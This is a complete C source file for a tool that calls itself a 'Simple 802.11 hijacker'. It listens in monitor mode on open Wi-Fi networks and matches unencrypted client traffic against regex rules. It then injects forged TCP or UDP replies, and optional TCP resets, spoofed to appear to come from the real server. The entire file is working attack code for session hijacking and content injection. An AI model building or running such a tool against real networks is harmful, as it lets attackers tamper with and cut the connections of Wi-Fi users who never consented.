#include <stdio.h>
#include <stdlib.h>
#include <getopt.h>
#include <unistd.h>
#include <signal.h>

#include <pthread.h>
#include <netinet/in.h>
#include <arpa/inet.h>

#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <netinet/udp.h>
#include <netinet/ip_icmp.h>

#include <lorcon2/lorcon.h> // For LORCON
#include <lorcon2/lorcon_ieee80211.h> // For LORCON
#include <lorcon2/lorcon_packasm.h>
#include <lorcon2/lorcon_forge.h>

#include <libnet.h>
#include <pcap.h>

#include <arpa/nameser.h>
#include <resolv.h>

#include "logger.h"
#include "matchers.h"

#define LLC_TYPE_IP 0x0800
#define HOP_DEFAULT_TIMEOUT 5
#define MTU 1400
#define LORCON_DISPATCH_CNT 50

#define ALRM_TIME 5

int debugged = 0;

// context for holding program state
struct ctx {
    char *interface_inj;
    char *interface_mon;

    char *interface_inj_vap;
    char *interface_mon_vap;

    u_int channels[14];
    u_int channel_fix;

    libnet_t *lnet;
    libnet_ptag_t p_tcp;
    libnet_ptag_t p_udp;
    libnet_ptag_t p_ip;

    lorcon_packet_t *n_pack;

    u_int mtu;

    char *matchers_filename;
    char *log_filename;
    struct matcher_entry *matchers_list;
    u_int hop_time;

    //LORCON structs
    lorcon_t *context_inj;
    lorcon_t *context_mon;
};

int dead;

void usage(char *argv[]) {
    printf("usage: %s -k <matchers file> [options]", argv[0]);
    printf("\nInterface options:\n");
    printf("\t-i <iface> : sets the listen/inject interface\n");
    printf("\t-m <iface> : sets the monitor interface\n");
    printf("\t-j <iface> : sets the inject interface\n");
    printf("\t-c <channels> : sets the channels for hopping(or not, if fix defined)\n");
    printf("\t-t <time> : hop sleep time in sec(default = 5 sec)\n");
    printf("\t-l <file> : file describing configuration for matchers\n");
    printf("\t-u <mtu> : set MTU size(default 1400)\n");
    printf("\t-d : enable debug messages\n");
    printf("\t-f : fix channel, this will disable hopping and starts to always use first channel in list\n");
    printf("\n");
    printf("Example(for single interface): %s -i wlan0 -c 1,6,11\n", argv[0]);
    printf("Example(for dual interfaces): %s -m wlan0 -j wlan1 -c 1,6,11\n", argv[0]);
    printf("Example(for single interface and channel fix): %s -i wlan0 -c 9 -f\n", argv[0]);
    printf("\n");
    exit(0);
}

void sig_handler(int sig) {

    signal(sig, SIG_IGN);

    switch(sig) {
    case SIGINT:
        dead = 1;
        (void) fprintf(stderr, "Got Ctrl+C, ending threads...%d sec alarm time\n", ALRM_TIME);
        signal(SIGALRM, sig_handler);
        alarm(ALRM_TIME);
        break;
    case SIGALRM:
        exit(0);
        break;
    }
}

void hexdump (void *addr, u_int len) {
    u_int i;
    u_char buff[17];
    u_char *pc = addr;

    // Process every byte in the data.
    for (i = 0; i < len; i++) {
        // Multiple of 16 means new line (with line offset).

        if ((i % 16) == 0) {
            // Just don't print ASCII for the zeroth line.
            if (i != 0) {
                printf ("  %s\n", buff);
            }
            // Output the offset.
            printf ("  %04x ", i);
        }

        // Now the hex code for the specific character.
        printf (" %02x", pc[i]);
        // And store a printable ASCII character for later.
        if ((pc[i] < 0x20) || (pc[i] > 0x7e)) {
            buff[i % 16] = '.';
        } else {
            buff[i % 16] = pc[i];
        }
        buff[(i % 16) + 1] = '\0';
    }

    // Pad out last line if not exactly 16 characters.
    while ((i % 16) != 0) {
        printf ("   ");
        i++;
    }
    // And print the final ASCII bit.
    printf ("  %s\n", buff);
}

/*
* Convenience function to extract the ssid name from a raw 802.11 frame
* and copy it to the ssid_name argument.  max_name_len is the length of
* the ssid_name buffer
*/
int get_ssid(const u_char *packet_data, char *ssid_name, u_short max_name_len) {

    if(packet_data[36] == 0) { // this is the SSID
        u_short ssid_len = packet_data[37];

        if(ssid_len == 0) {
            ssid_name[0] = 0;
            return 0;
        }

        u_short max_len = ssid_len > max_name_len ? max_name_len - 1 : ssid_len;
        memcpy(ssid_name, &packet_data[38], max_len);
        ssid_name[max_len] = 0;

        return 0;
    }

    return -1;
}

struct matcher_entry *matchers_match(const char *data, int datalen, struct ctx *ctx, u_int proto, u_int src_port, u_int dst_port) {
    struct matcher_entry *matcher;
    int ovector[30];

    for(matcher = ctx->matchers_list; matcher != NULL; matcher = matcher->next) {
        if(matcher->proto != MATCHER_PROTO_ANY && matcher->proto != proto) {
            continue;
        }
        if((matcher->dst_port > 0 && matcher->dst_port != dst_port) || (matcher->src_port > 0 && matcher->src_port != src_port)) {
            continue;
        }
        if(pcre_exec(matcher->match, NULL, data, datalen,  0, 0, ovector, 30) > 0) {
            logger(INFO, "Matched pattern for '%s'", matcher->name);
            if(matcher->ignore && pcre_exec(matcher->ignore, NULL, data, datalen, 0, 0, ovector, 30) > 0) {
                logger(INFO, "Matched ignore for '%s'", matcher->name);
                continue;
            } else {
                return matcher;
            }
        }
    }
    return NULL;
}

struct matcher_entry *get_response(u_char *data, u_int datalen, struct ctx *ctx, u_int type, u_int src_port, u_int dst_port) {

    struct matcher_entry *matcher;

    #ifdef HAVE_PYTHON
    PyObject *args;
    PyObject *value;
    Py_ssize_t rdatalen;
    char *rdata;
    #endif


    if(!(matcher = matchers_match((const char *)data, datalen, ctx, type, src_port, dst_port))) {
        logger(DBG, "No matchers found for data");
        return NULL;
    }

    #ifdef HAVE_PYTHON
    if(matcher->pyfunc) {
        logger(DBG, "We have a Python code to construct response");
        args = PyTuple_New(2);
        PyTuple_SetItem(args,0,PyString_FromStringAndSize((const char *)data, datalen)); // here is data
        PyTuple_SetItem(args,1,PyInt_FromSsize_t(datalen));

        value = PyObject_CallObject(matcher->pyfunc, args);
        if(value == NULL) {
            PyErr_Print();
            logger(WARN, "Python function returns no data!");
            return NULL;
        }

        rdata = PyString_AsString(value);
        rdatalen = PyString_Size(value);

        if(rdata != NULL && rdatalen > 0) {
            matcher->response_len = (u_int) rdatalen;
            if(matcher->response) {
                // We already have previous response, free it
                free(matcher->response);
            }
            matcher->response = malloc(matcher->response_len);
            memcpy(matcher->response, (u_char *) rdata, rdatalen);
        } else {
            PyErr_Print();
            logger(WARN, "Python cannot convert return string");
            return NULL;
        }
        return matcher;
    }
    #endif
    
    if(matcher->response) {
        logger(DBG, "We have a plain text response");
        return matcher;
    }

    logger(WARN, "There is no response data!");
    return NULL;

}

int build_tcp_packet(struct iphdr *ip_hdr, struct tcphdr *tcp_hdr, u_char *data, u_int datalen, u_int tcpflags, u_int seqnum, struct ctx *ctx) {

    // libnet wants the data in host-byte-order
    ctx->p_tcp = libnet_build_tcp(
                ntohs(tcp_hdr->dest), // source port
                ntohs(tcp_hdr->source), // dest port
                seqnum, // sequence number
                ntohl(tcp_hdr->seq) + ( ntohs(ip_hdr->tot_len) - ip_hdr->ihl * 4 - tcp_hdr->doff * 4 ), // ack number
                tcpflags, // tcp flags
                0xffff, // window size
                0, // checksum, libnet will autofill it
                0, // urg ptr
                LIBNET_TCP_H + datalen, // total length of the TCP packet
                (u_char *)data, // response
                datalen, // response_length
                ctx->lnet, // libnet_t pointer
                ctx->p_tcp // protocol tag
            );

    if(ctx->p_tcp == -1) {
        logger(WARN, "libnet_build_tcp returns error: %s", libnet_geterror(ctx->lnet));
        return 0;
    }

    ctx->p_ip = libnet_build_ipv4(
                LIBNET_TCP_H + LIBNET_IPV4_H + datalen, // total length of IP packet
                0, // TOS bits, type of service
                1, // IPID identification number (need to calculate)
                0, // fragmentation offset
                0xff, // TTL time to live
                IPPROTO_TCP, // upper layer protocol
                0, // checksum, libnet will autofill it
                ip_hdr->daddr, // source IPV4 address
                ip_hdr->saddr, // dest IPV4 address
                NULL, // response, no payload
                0, // response length
                ctx->lnet, // libnet_t pointer
                ctx->p_ip // protocol tag
            );

    if(ctx->p_ip == -1) {
        logger(WARN, "libnet_build_ipv4 returns error: %s", libnet_geterror(ctx->lnet));
        return 0;
    }

    return 1;
}

int build_udp_packet(struct iphdr *ip_hdr, struct udphdr *udp_hdr, u_char *data, u_int datalen, struct ctx *ctx) {

    ctx->p_udp = libnet_build_udp(
                ntohs(udp_hdr->source), // source port
                ntohs(udp_hdr->dest), // destination port
                LIBNET_UDP_H + datalen, // total length of the UDP packet
                0, // libnet will autofill the checksum
                NULL, // payload
                0, // payload length
                ctx->lnet, // pointer to libnet context
                ctx->p_udp // protocol tag for udp
            );
    if(ctx->p_udp == -1) {
        logger(WARN, "libnet_build_tcp returns error: %s", libnet_geterror(ctx->lnet));
        return 0;
    }

    ctx->p_ip = libnet_build_ipv4(
                LIBNET_UDP_H + LIBNET_IPV4_H + datalen, // total length of IP packet
                0, // TOS bits, type of service
                1, // IPID identification number (need to calculate)
                0, // fragmentation offset
                0xff, // TTL time to live
                IPPROTO_UDP, // upper layer protocol
                0, // checksum, libnet will autofill it
                ip_hdr->daddr, // source IPV4 address
                ip_hdr->saddr, // dest IPV4 address
                NULL, // response, no payload
                0, // response length
                ctx->lnet, // libnet_t pointer
                ctx->p_ip // protocol tag=0, build new
            );

    if(ctx->p_ip == -1) {
        logger(WARN, "libnet_build_ipv4 returns error: %s", libnet_geterror(ctx->lnet));
        return 0;
    }

    return 1;
}

lorcon_packet_t *build_wlan_packet(u_char *l2data, int l2datalen, lorcon_packet_t *packet, struct ctx *ctx) {

    lorcon_packet_t *n_pack;
    u_char mac0[6];
    u_char mac1[6];
    u_char mac2[6];
    u_char llc[8];

    struct lorcon_dot11_extra *i_hdr;
    i_hdr = (struct lorcon_dot11_extra *) packet->extra_info;

    memcpy(&mac0, i_hdr->source_mac, 6);
    memcpy(&mac1, i_hdr->dest_mac, 6);
    memcpy(&mac2, i_hdr->bssid_mac, 6);

    n_pack = malloc(sizeof(lorcon_packet_t));
    memset(n_pack, 0, sizeof(lorcon_packet_t));
    n_pack->lcpa = lcpa_init();

    lcpf_80211headers(
        n_pack->lcpa,
        WLAN_FC_TYPE_DATA, // type
        WLAN_FC_SUBTYPE_DATA, // subtype
        WLAN_FC_FROMDS, // direction WLAN_FC_FROMDS(dest,bssid,src)/WLAN_FC_TODS(bssid,src,dest)
        0x00, // duration
        mac0,
        mac2,
        mac2,
        NULL, // addr4 ??
        0, // fragment
        1234 // Sequence number
    );

    // Alias the IP type
    if (l2datalen > 14) {
        llc[0] = 0xaa;
        llc[1] = 0xaa;
        llc[2] = 0x03;
        llc[3] = 0x00;
        llc[4] = 0x00;
        llc[5] = 0x00;
        llc[6] = 0x08; // here must be ip type, last two bytes 0x08, 0x00
        llc[7] = 0x00;
    }
    n_pack->lcpa = lcpa_append_copy(n_pack->lcpa, "LLC", sizeof(llc), llc);
    n_pack->lcpa = lcpa_append_copy(n_pack->lcpa, "DATA", l2datalen, l2data);

    // remember to free packet
    return n_pack;

}

int lorcon_send_packet(lorcon_packet_t *packet, struct ctx *ctx) {
    
    u_char *ip_data;
    u_int ip_datalen;

    // cull_packet will dump the packet (with correct checksums) into a
    // buffer for us to send via the raw socket. memory must be freed after that
    if(libnet_adv_cull_packet(ctx->lnet, &ip_data, &ip_datalen) == -1) {
        logger(WARN, "libnet_adv_cull_packet returns error: %s", libnet_geterror(ctx->lnet));
        return 0;
    }

    // if we already have this pointer then we sending a round of packets in a cycle, no need to forge all 802.11 headers.
    if(ctx->n_pack) {
        lcpa_replace_copy(ctx->n_pack->lcpa, "DATA", ip_datalen, ip_data);
    } else {
        ctx->n_pack = build_wlan_packet(ip_data, ip_datalen, packet, ctx);
    }

    if(ctx->n_pack) {
        //hexdump(ip_data, ip_datalen);

        if (lorcon_inject(ctx->context_inj, ctx->n_pack) < 0) {
            return 0;
        } 
    }
    libnet_adv_free_packet(ctx->lnet, ip_data);

    return 1;
}

void clear_packet(struct ctx *ctx) {
    if(ctx->n_pack) {
        lorcon_packet_free(ctx->n_pack);
        ctx->n_pack = NULL;
    }
    if(ctx->lnet) {
        libnet_clear_packet(ctx->lnet);
        ctx->p_ip = 0;
        ctx->p_tcp = 0;
        ctx->p_udp = 0;
    }
}

void process_ip_packet(const u_char *dot3, u_int dot3_len, struct ctx *ctx, lorcon_packet_t *packet) {

    struct iphdr *ip_hdr;
    struct tcphdr *tcp_hdr;
    struct udphdr *udp_hdr;
    struct icmphdr *icmp_hdr;

    u_char *tcp_data;
    u_int tcp_datalen;

    u_char *udp_data;
    u_int udp_datalen;

    struct matcher_entry *matcher;

    int frag_offset;
    int frag_len;

    u_int tcpseqnum;
    u_int tcpflags;

    /* Calculate the size of the IP Header. ip_hdr->ihl contains the number of 32 bit
    words that represent the header size. Therfore to get the number of bytes
    multiple this number by 4 */

    ip_hdr = (struct iphdr *) (dot3);

    logger(DBG, "IP id:%d tos:0x%x version:%d iphlen:%d dglen:%d protocol:%d ttl:%d", ntohs(ip_hdr->id), ip_hdr->tos, ip_hdr->version, ip_hdr->ihl*4, ntohs(ip_hdr->tot_len), ip_hdr->protocol, ip_hdr->ttl);
    logger(DBG, "SRC: %s", inet_ntoa(*((struct in_addr *) &ip_hdr->saddr)));
    logger(DBG, "DST: %s", inet_ntoa(*((struct in_addr *) &ip_hdr->daddr)));

    if(ntohs(ip_hdr->tot_len) > dot3_len) {
        logger(DBG, "Ambicious len in IP header, skipping");
        return;
    }

    switch (ip_hdr-> protocol) {
    case IPPROTO_TCP:
    
        /* Calculate the size of the TCP Header. tcp->doff contains the number of 32 bit
         words that represent the header size. Therfore to get the number of bytes
         multiple this number by 4 */
        tcp_hdr = (struct tcphdr *) (dot3+sizeof(struct iphdr));
        tcp_datalen = ntohs(ip_hdr->tot_len) - (ip_hdr->ihl * 4) - (tcp_hdr->doff * 4);
        logger(DBG, "TCP src_port:%d dest_port:%d doff:%d datalen:%d ack:0x%x win:0x%x seq:%d", ntohs(tcp_hdr->source), ntohs(tcp_hdr->dest), tcp_hdr->doff*4, tcp_datalen, ntohs(tcp_hdr->window), ntohl(tcp_hdr->ack_seq), ntohs(tcp_hdr->seq));
        logger(DBG, "FLAGS %c%c%c%c%c%c",
               (tcp_hdr->urg ? 'U' : '*'),
               (tcp_hdr->ack ? 'A' : '*'),
               (tcp_hdr->psh ? 'P' : '*'),
               (tcp_hdr->rst ? 'R' : '*'),
               (tcp_hdr->syn ? 'S' : '*'),
               (tcp_hdr->fin ? 'F' : '*'));

        // make sure the packet isn't empty..
        if(tcp_datalen <= 0) {
            logger(DBG, "TCP datalen <= 0, ignoring it");
            break;
        }
        tcp_data = (u_char*) tcp_hdr + tcp_hdr->doff * 4;

        if((matcher = get_response(tcp_data, tcp_datalen, ctx, MATCHER_PROTO_TCP, ntohs(tcp_hdr->source), ntohs(tcp_hdr->dest)))) {
            logger(INFO, "Matched TCP packet %s:%d -> %s:%d len:%d", inet_ntoa(*((struct in_addr *) &ip_hdr->saddr)), ntohs(tcp_hdr->source), inet_ntoa(*((struct in_addr *) &ip_hdr->daddr)), ntohs(tcp_hdr->dest),tcp_datalen);

            tcpseqnum = ntohl(tcp_hdr->ack_seq);
            for(frag_offset = 0; frag_offset < matcher->response_len; frag_offset += ctx->mtu) {

                frag_len = matcher->response_len - frag_offset;
                if(frag_len > ctx->mtu) {
                    frag_len = ctx->mtu;
                }

                if((frag_offset + ctx->mtu) > matcher->response_len) {
                    tcpflags = TH_PUSH | TH_ACK;
                } else {
                    tcpflags = TH_ACK;
                }

                if(!build_tcp_packet(ip_hdr, tcp_hdr, matcher->response + frag_offset, frag_len, tcpflags, tcpseqnum, ctx)) {
                    logger(WARN, "Fail to build TCP packet");
                    // clear packet?
                    break;
                }
                tcpseqnum = tcpseqnum + frag_len;

                if(!lorcon_send_packet(packet, ctx)) {
                    logger(WARN, "Cannot inject TCP packet");
                }
            }
            logger(INFO, "TCP packet successfully injected. response_len: %d", matcher->response_len);

            // reset packet handling
            if(matcher->options & MATCHER_OPTION_RESET) {
                if(!build_tcp_packet(ip_hdr, tcp_hdr, NULL, 0, TH_RST | TH_ACK, tcpseqnum, ctx)) {
                    logger(WARN, "Fail to build TCP reset packet");
                    // clear packet?
                    break;
                }
                if(!lorcon_send_packet(packet, ctx)) {
                    logger(WARN, "Cannot inject TCP reset packet");
                }
                logger(INFO, "TCP reset packet successfully injected");
            }
            clear_packet(ctx);
        }
        break;
    case IPPROTO_UDP:
        udp_hdr = (struct udphdr *) (dot3+sizeof(struct iphdr));
        udp_datalen = ntohs(udp_hdr->len) - sizeof(struct udphdr);
        logger(DBG, "UDP src_port:%d dst_port:%d len:%d", ntohs(udp_hdr->source), ntohs(udp_hdr->dest), udp_datalen);

        // make sure the packet isn't empty..
        if(udp_datalen <= 0) {
            logger(DBG, "UDP datalen <= 0, ignoring it");
            break;
        }
        udp_data = (u_char*) udp_hdr + sizeof(struct udphdr);

        if((matcher = get_response(udp_data, udp_datalen, ctx, MATCHER_PROTO_UDP, ntohs(udp_hdr->source), ntohs(udp_hdr->dest)))) {
            logger(INFO, "Matched UDP packet %s:%d -> %s:%d len:%d", inet_ntoa(*((struct in_addr *) &ip_hdr->saddr)), ntohs(udp_hdr->source), inet_ntoa(*((struct in_addr *) &ip_hdr->daddr)), ntohs(udp_hdr->dest), udp_datalen);

            for(frag_offset = 0; frag_offset < matcher->response_len; frag_offset += ctx->mtu) {

                frag_len = matcher->response_len - frag_offset;
                if(frag_len > ctx->mtu) {
                    frag_len = ctx->mtu;
                }

                if(!build_udp_packet(ip_hdr, udp_hdr, matcher->response + frag_offset, frag_len, ctx)) {
                    logger(WARN, "Fail to build UDP packet");
                    // clear packet?
                    break;
                }
                if(!lorcon_send_packet(packet, ctx)) {
                    logger(WARN, "Cannot inject UDP packet");
                }
            }
            logger(INFO, "UDP packet successfully injected. response_len: %d", matcher->response_len);

            // UDP "reset" packet handling, just send an empty UDP packet
            if(matcher->options & MATCHER_OPTION_RESET) {
                logger(INFO, "UDP reset packet sending");
                if(!build_udp_packet(ip_hdr, udp_hdr, NULL, 0, ctx)) {
                    logger(WARN, "Fail to build UDP reset packet");
                    // clear packet?
                    break;
                }
                if(lorcon_send_packet(packet, ctx)) {
                    logger(WARN, "Cannot inject UDP reset packet");
                }
                logger(INFO, "UDP reset packet successfully injected");
            }
            clear_packet(ctx);
        }

        // do nothing
        break;

    case IPPROTO_ICMP:
        icmp_hdr = (struct icmphdr *) (dot3+sizeof(struct iphdr));
        //memcpy(&id, (u_char*)icmphdr+4, 2);
        //memcpy(&seq, (u_char*)icmphdr+6, 2);
        logger(DBG, "ICMP type:%d code:%d", icmp_hdr->type, icmp_hdr->code);
        break;
    }
}

/*
* Called by lorcon_loop for every packet
*/
void process_wlan_packet(lorcon_packet_t *packet, struct ctx *ctx) {

    struct lorcon_dot11_extra *i_hdr;
    char ssid_name[256];

    logger(DBG, "Packet, dlt: %d len: %d h_len: %d d_len: %d", packet->dlt, packet->length, packet->length_header, packet->length_data);

    if(packet->extra_type != LORCON_PACKET_EXTRA_80211 || packet->extra_info == NULL) {
        logger(WARN, "Packet has no extra, cannot be parsed");
        hexdump((u_char *) packet->packet_raw, packet->length);
        return;
    }

    i_hdr = (struct lorcon_dot11_extra *) packet->extra_info;
    if(i_hdr->type == WLAN_FC_TYPE_DATA) { // data frames

        logger(DBG, "IEEE802.11 data, type:%d subtype:%d direction:%s protected:%c src_mac:[%02X:%02X:%02X:%02X:%02X:%02X] dst_mac:[%02X:%02X:%02X:%02X:%02X:%02X] bssid_mac:[%02X:%02X:%02X:%02X:%02X:%02X]",
               i_hdr->type,
               i_hdr->subtype,
               i_hdr->from_ds ? "from_ds -->":"to_ds <--",
               i_hdr->protected ? 'y':'n',
               i_hdr->source_mac[0], i_hdr->source_mac[1], i_hdr->source_mac[2], i_hdr->source_mac[3], i_hdr->source_mac[4], i_hdr->source_mac[5],
               i_hdr->dest_mac[0], i_hdr->dest_mac[1], i_hdr->dest_mac[2], i_hdr->dest_mac[3], i_hdr->dest_mac[4], i_hdr->dest_mac[5],
               i_hdr->bssid_mac[0], i_hdr->bssid_mac[1], i_hdr->bssid_mac[2], i_hdr->bssid_mac[3], i_hdr->bssid_mac[4], i_hdr->bssid_mac[5]);

        if(i_hdr->protected) {
            logger(DBG, "\tWe are not interested in protected packets, skipping it");
            return;
        }

        if(!(i_hdr->to_ds) || i_hdr->from_ds) {
            logger(DBG, "\tPacket from DS, skipping it");
            return;
        }

        switch(i_hdr->subtype) {
        case WLAN_FC_SUBTYPE_QOSDATA:
            if(packet->length_data == 0) {
                logger(DBG, "\tWe are not interested in empty packets, skipping it");
                break;
            }

            switch(htons(i_hdr->llc_type)) {

            case LLC_TYPE_IP:
                process_ip_packet(packet->packet_data, packet->length_data, ctx, packet);
                break;
            default:
                logger(DBG, "\tLLC said that packet has no IP layer, skipping it");
                break;
            }

            break;
        case WLAN_FC_SUBTYPE_DATA:
            // sometimes this data is coming from DS to client.
            break;
        }

    } else if(i_hdr->type == WLAN_FC_TYPE_MGMT) { // management frames
        switch(i_hdr->subtype) {
        case WLAN_FC_SUBTYPE_BEACON:
            get_ssid(packet->packet_header, ssid_name, sizeof(ssid_name));
            logger(DBG, "IEEE802.11 beacon frame, ssid: (%s)", ssid_name);
            break;
        case WLAN_FC_SUBTYPE_PROBEREQ:
            get_ssid(packet->packet_header, ssid_name, sizeof(ssid_name));
            logger(DBG, "IEEE802.11 probe request, ssid: (%s)", ssid_name);
            break;
        case WLAN_FC_SUBTYPE_PROBERESP:
            get_ssid(packet->packet_header, ssid_name, sizeof(ssid_name));
            logger(DBG, "IEEE802.11 probe response, ssid: (%s)", ssid_name);
            break;
        }
    } else if(i_hdr->type == WLAN_FC_TYPE_CTRL) { // control frames
        // NOTHING HERE
    }

    lorcon_packet_free(packet);
}


void process_packet(lorcon_t *context, lorcon_packet_t *packet, u_char *user) {

    struct ctx *ctx;
    ctx = (struct ctx *) user;

    if(dead) {
        lorcon_breakloop(context);
    } else {
        process_wlan_packet(packet, ctx);
    }
}

lorcon_t *init_lorcon_interface(const char *interface) {

    lorcon_driver_t *driver; // Needed to set up interface/context
    lorcon_t *context; // LORCON context
    u_char *mac;
    u_int r;

    // Automatically determine the driver of the interface

    if ((driver = lorcon_auto_driver(interface)) == NULL) {
        logger(FATAL, "Could not determine the driver for %s", interface);
        return NULL;
    }
    logger(INFO, "Interface: %s, Driver: %s", interface, driver->name);

    // Create LORCON context for interface
    if ((context = lorcon_create(interface, driver)) == NULL) {
        logger(FATAL, "Failed to create context");
        return NULL;
    }

    // set vap name
    //lorcon_set_vap(context, "mon0");

    // Create inject+monitor mode interface
    if (lorcon_open_injmon(context) < 0) {
        logger(FATAL, "Could not create inject+monitor mode interface!");
        return NULL;
    }

    r = lorcon_get_hwmac(context, &mac);
    if(r < 0 ) {
        logger(WARN, "Fail to fetch HW addr from: %s", interface);
    } else if (r == 0) {
        logger(WARN, "HW addr is not set on: %s", interface);
    }

    logger(INFO, "VAP: %s, HW: %02x:%02x:%02x:%02x:%02x:%02x", lorcon_get_vap(context), mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);

    lorcon_free_driver_list(driver);

    return context;
}

void clear_lorcon_interface(lorcon_t *context) {
    // Close the monitor interface
    lorcon_close(context);

    // Free the monitor LORCON Context
    lorcon_free(context);
}

void *loop_thread(void *arg) {
    struct ctx *ctx = (struct ctx *)arg;

    logger(DBG, "Main loop started");
    while(1) {
        if(dead) {
            logger(DBG, "Got dead! Loop thread is closing now");
            return NULL;
        }
        lorcon_dispatch(ctx->context_mon, LORCON_DISPATCH_CNT, process_packet, (u_char*)ctx);
    }
    return NULL;
}

void *channel_thread(void *arg) {
    struct ctx *ctx = (struct ctx *)arg;

    u_int ch_c;

    if(ctx->channel_fix) {
        // set first in array
        logger(INFO, "Default channel set: %d", ctx->channels[0]);
        lorcon_set_channel(ctx->context_inj, ctx->channels[0]);
        lorcon_set_channel(ctx->context_mon, ctx->channels[0]);
    } else {
        // enter loop
        while(1) {
            for(ch_c = 0; ch_c < sizeof(ctx->channels); ch_c++) {
                if(dead) {
                    logger(INFO, "Got dead! Channel thread is closing now");
                    return NULL;
                }
                if(!ctx->channels[ch_c]) break;
                logger(DBG, "Periodical channel change: %d", ctx->channels[ch_c]);
                lorcon_set_channel(ctx->context_inj, ctx->channels[ch_c]);
                lorcon_set_channel(ctx->context_mon, ctx->channels[ch_c]);
                sleep(ctx->hop_time);
            }
        }
    }

    return NULL;
}

int main(int argc, char *argv[]) {

    int c;
    pthread_t loop_tid;
    pthread_t channel_tid;
    char lnet_err[LIBNET_ERRBUF_SIZE];

    int ch_c;
    char *ch;

    struct ctx *ctx = calloc(1, sizeof(struct ctx));

    if(ctx == NULL) {
        perror("calloc");
        exit(1);
    }

    ctx->channel_fix=0;
    ctx->mtu = MTU;
    ctx->hop_time = HOP_DEFAULT_TIMEOUT;
    ctx->matchers_filename = MATCHERS_DEFAULT_FILENAME;
    ctx->log_filename = NULL;

    printf ("%s - Simple 802.11 hijacker\n", argv[0]);
    printf ("-----------------------------------------------------\n\n");

    // This handles all of the command line arguments

    while ((c = getopt(argc, argv, "i:c:j:m:ft:l:k:hdu:")) != EOF) {
        switch (c) {
        case 'i':
            ctx->interface_inj = strdup(optarg);
            ctx->interface_mon = strdup(optarg);
            break;
        case 'j':
            ctx->interface_inj = strdup(optarg);
            break;
        case 'm':
            ctx->interface_mon = strdup(optarg);
            break;
        case 'c':
            ch_c = 0;
            ch = strtok(optarg, ",");
            while(ch != NULL) {
                if(atoi(ch) >0 && atoi(ch) <= 14 && ch_c < sizeof(ctx->channels)) {
                    ;
                    ctx->channels[ch_c] = atoi(ch);
                    ch_c++;
                }
                ch = strtok(NULL, ",");
            }
            ctx->channels[ch_c] = 0;
            break;
        case 'f':
            ctx->channel_fix = 1;
            break;
        case 't':
            ctx->hop_time = atoi(optarg);
            break;
        case 'l':
            ctx->log_filename = strdup(optarg);
            break;
        case 'k':
            ctx->matchers_filename = strdup(optarg);
            break;
        case 'h':
            usage(argv);
            break;
        case 'd':
            debugged = 1;
            break;
        case 'u':
            ctx->mtu = atoi(optarg);
            break;
        default:
            usage(argv);
            break;
        }
    }

    if (getuid() != 0) {
        (void) fprintf(stderr, "You must be ROOT to run this!\n");
        return -1;
    }

    signal(SIGINT, sig_handler);

    if (ctx->interface_inj == NULL || ctx->interface_mon == NULL || !ctx->channels[0]) {
        (void) fprintf(stderr, "Interfaces or channel not set (see -h for more info)\n");
        return -1;
    }

    if(ctx->hop_time <= 0) {
        (void) fprintf(stderr, "Hop timeout must be > 0 (remember, it is defined in round seconds)\n");
        return -1;
    };

    if(ctx->mtu <= 0 || ctx->mtu > 1500) {
        (void) fprintf(stderr, "MTU must be > 0 and < 1500\n");
        return -1;
    }

    if(!(ctx->matchers_list = parse_matchers_file(ctx->matchers_filename))) {
        (void) fprintf(stderr, "Error during parsing matchers file: %s\n", ctx->matchers_filename);
        return -1;
    }

    if (!logger_init(ctx->log_filename)) {
        (void) fprintf(stderr, "Fail to open log file: %s (%s)\n", ctx->log_filename, strerror(errno));
        return -1;
    } else if(ctx->log_filename) {
        (void) fprintf(stderr, "Logging to file: %s\n", ctx->log_filename);
    }

    ctx->lnet = libnet_init(LIBNET_LINK_ADV, "lo", lnet_err);
    if(ctx->lnet == NULL) {
        logger(FATAL, "Error in libnet_init: %s", lnet_err);
        return -1;
    }

    // The following is all of the standard interface, driver, and context setup
    logger(INFO, "Initializing %s interface for inject", ctx->interface_inj);
    if((ctx->context_inj = init_lorcon_interface(ctx->interface_inj)) == NULL) {
        logger(FATAL, "Fail to initialize inject interface: %s", ctx->interface_inj);
        return -1;
    }

    logger(INFO, "Initializing %s interface for monitor", ctx->interface_mon);
    if((ctx->context_mon = init_lorcon_interface(ctx->interface_mon)) == NULL) {
        logger(FATAL, "Fail to initialize monitor interface: %s", ctx->interface_mon);
        return -1;
    }

    ctx->interface_inj_vap = strdup(lorcon_get_vap(ctx->context_inj));
    ctx->interface_mon_vap = strdup(lorcon_get_vap(ctx->context_mon));

    // Set the channels we'll be monitor and inject on
    for (ch_c = 0; ch_c <= sizeof(ctx->channels); ch_c++) {
        if(!ctx->channels[ch_c]) break;
        if(ch_c == 0) {
            logger(INFO, "Using monitor and injection channel: %d (default if channel fix defined)", ctx->channels[ch_c]);
        } else {
            logger(INFO, "Using monitor and injection channel: %d", ctx->channels[ch_c]);
        }
    }

    // Create threads
    if(pthread_create(&loop_tid, NULL, loop_thread, ctx)) {
        logger(FATAL, "Error in pcap pthread_create");
        return -1;
    }

    if(pthread_create(&channel_tid, NULL, channel_thread, ctx)) {
        logger(FATAL, "Error in channel pthread_create");
        return -1;
    }

    // Wait for threads to join
    if(pthread_join(channel_tid, NULL)) {
        logger(FATAL, "Error joining channel thread");
    }

    if(pthread_join(loop_tid, NULL)) {
        logger(FATAL, "Error joining pcap thread");
    }

    logger(INFO, "We are done");
    // The following is all of the standard cleanup stuff
    clear_lorcon_interface(ctx->context_inj);
    clear_lorcon_interface(ctx->context_mon);

    return 0;
}

